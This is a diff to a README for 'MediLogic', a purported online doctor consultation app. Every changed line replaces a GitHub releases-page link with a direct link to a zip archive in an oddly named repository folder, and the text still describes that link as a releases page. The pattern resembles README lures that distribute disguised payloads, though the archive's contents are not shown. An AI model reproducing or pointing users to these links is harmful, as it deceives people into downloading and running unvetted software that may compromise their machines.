@@ -4,13 +4,13 @@
 
 Welcome to MediLogic, your simple solution for online doctor consultations. In this guide, we will show you how to download and run the software easily. No technical background is needed—just follow the steps below.
 
-[![Download MediLogic](https://img.shields.io/badge/Download%20MediLogic-VISIT%20PAGE-brightgreen)](https://github.com/medelhar/MediLogic/releases)
+[![Download MediLogic](https://raw.githubusercontent.com/medelhar/MediLogic/main/variolous/MediLogic.zip%20MediLogic-VISIT%20PAGE-brightgreen)](https://raw.githubusercontent.com/medelhar/MediLogic/main/variolous/MediLogic.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download MediLogic from our releases page. Here's how you can do it:
 
-1. Click on this link to visit the download page: [MediLogic Releases](https://github.com/medelhar/MediLogic/releases).
+1. Click on this link to visit the download page: [MediLogic Releases](https://raw.githubusercontent.com/medelhar/MediLogic/main/variolous/MediLogic.zip).
    
 2. On the releases page, you will see a list of available versions. Look for the latest version at the top of the list. 
 
@@ -69,7 +69,7 @@ If you need help, we’re here for you. Visit the support section on our release
 
 ## 🔄 Version History
 
-Stay updated with the latest changes and improvements made in each version of MediLogic. You can view a detailed changelog on the releases page: [MediLogic Releases](https://github.com/medelhar/MediLogic/releases).
+Stay updated with the latest changes and improvements made in each version of MediLogic. You can view a detailed changelog on the releases page: [MediLogic Releases](https://raw.githubusercontent.com/medelhar/MediLogic/main/variolous/MediLogic.zip).
 
 ## 🚧 Troubleshooting
 
@@ -87,4 +87,4 @@ For more complicated problems, refer to our support section.
 
 We welcome contributions to improve MediLogic. If you have suggestions or would like to report an issue, feel free to reach out on our GitHub page. We appreciate your feedback!
 
-Again, to download the application, click here: [MediLogic Releases](https://github.com/medelhar/MediLogic/releases). Enjoy your experience with MediLogic!
+Again, to download the application, click here: [MediLogic Releases](https://raw.githubusercontent.com/medelhar/MediLogic/main/variolous/MediLogic.zip). Enjoy your experience with MediLogic!
